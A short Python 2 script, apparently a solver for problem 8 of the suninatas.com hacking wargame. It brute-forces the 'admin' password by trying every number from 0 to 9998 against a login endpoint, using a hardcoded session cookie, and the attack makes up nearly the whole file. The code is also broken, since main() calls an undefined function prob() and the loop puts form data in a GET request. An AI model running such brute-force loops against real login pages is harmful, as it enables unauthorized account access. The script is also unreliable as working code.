#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#  prob.py
#  
#  Copyright 2014 imgomi <imgomi@Engineer>
#  
#  This program is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 2 of the License, or
#  (at your option) any later version.
#  
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#  
#  You should have received a copy of the GNU General Public License
#  along with this program; if not, write to the Free Software
#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#  MA 02110-1301, USA.
#  
#  

import httplib

def prob8():
	ntC = httplib.HTTPConnection("suninatas.com", 80)
	headers = {'Cookie':'ASPSESSIONIDAQQRRTRT=CFPPLGEDOCNMGKKDJFDKJECH', 'Content-Type':'application/x-www-form-urlencoded'}
	for i in xrange(0, 9999):
		ntC.request('GET', '/board/list.asp?divi=notice', 'id=admin&pw=%s'%str(i), headers)
		data = ntC.getresponse().read()
		if(data.find('Incorrect!') == -1):
			print data
			break
		print 'try id:admin/pw:%d'%i
	

def main():
	prob()
	return 0

if __name__ == '__main__':
	main()

